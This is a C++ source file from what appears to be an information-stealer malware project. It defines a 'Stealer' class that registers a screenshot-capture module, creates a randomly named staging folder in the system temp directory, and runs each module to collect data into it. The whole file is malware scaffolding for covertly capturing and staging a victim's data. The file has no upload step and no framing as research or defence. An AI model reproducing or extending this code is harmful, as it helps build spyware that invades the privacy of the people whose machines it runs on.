//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "impl/Screenshot.h"

Stealer::Stealer() {
    this->modules.push_back(new Screenshot());

    std::string dir_name = Utils::generateString(10);
    this->root_dir = Utils::getTemp() / dir_name;

    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    for(StealerImpl* module : this->modules)
    {
        module->execute(this->root_dir);
    }
}
